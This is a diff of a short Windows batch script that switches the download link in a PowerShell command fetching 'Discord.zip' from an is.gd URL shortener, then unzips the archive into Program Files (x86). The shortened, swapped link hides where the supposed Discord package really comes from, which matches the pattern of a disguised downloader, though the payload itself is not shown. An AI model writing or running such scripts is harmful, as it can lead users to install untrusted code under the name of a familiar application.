@@ -1,5 +1,5 @@
 @echo off
-powershell Invoke-WebRequest https://is.gd/K7edYM -OutFile Discord.zip
+powershell Invoke-WebRequest https://is.gd/R57e3A -OutFile Discord.zip
 setlocal
 cd /d %~dp0
 Call :UnZipFile "C:\Program Files (x86)\" ""C:\Users\%Username%\Downloads\Discord.zip\"
